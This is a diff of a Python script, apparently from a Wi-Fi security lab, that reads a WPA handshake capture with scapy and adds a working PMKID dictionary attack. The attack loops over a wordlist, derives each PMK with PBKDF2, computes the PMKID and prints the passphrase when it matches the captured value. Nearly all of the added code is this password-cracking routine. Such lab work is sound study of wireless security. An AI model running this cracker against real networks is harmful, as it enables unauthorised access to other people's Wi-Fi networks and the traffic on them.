@@ -27,20 +27,7 @@ import hmac, hashlib
 from scapy.contrib.wpa_eapol import WPA_key, EAPOL
 from scapy.layers.dot11 import Dot11, Dot11Beacon
 
-def customPRF512(key,A,B):
-    """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
-    """
-    blen = 64
-    i    = 0
-    R    = b''
-    while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
-        i+=1
-        R = R+hmacsha1.digest()
-    return R[:blen]
-
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
+# Read capture file
 wpa=rdpcap("PMKID_handshake.pcap")
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
@@ -49,11 +36,26 @@ APmac       = a2b_hex(wpa[145][Dot11].addr2.replace(':', ''))
 Clientmac   = a2b_hex(wpa[145][Dot11].addr1.replace(':', ''))
 PMKID       = wpa[145].original[193:209]
 
-
 print ("\n\nValues used to derivate keys")
 print ("============================")
-print ("SSID: ",ssid,"\n")
-print ("AP Mac: ",b2a_hex(APmac),"\n")
-print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
-print ("PMKID: ", b2a_hex(PMKID),"\n")
+print ("SSID:",ssid,"\n")
+print ("AP Mac:",b2a_hex(APmac),"\n")
+print ("CLient Mac:",b2a_hex(Clientmac),"\n")
+print ("PMKID:", b2a_hex(PMKID),"\n")
 
+# Read passphrases in wordlist.txt
+wordlist = open('wordlist.txt', 'r')
+
+for w in wordlist.read().splitlines():
+    # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    pmk = pbkdf2(hashlib.sha1, str.encode(w), str.encode(ssid), 4096, 32)
+
+    # Calculate PMKID of the passphrase
+    PMID_test = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1).digest()[:16]
+
+    # Compare the PMKID found in capture file with the one calculated for the passphrase
+    if PMKID == PMID_test:
+        print("Found passphrase:", w)
+        break
+    else:
+        print("Passphrase", w, "is not correct")
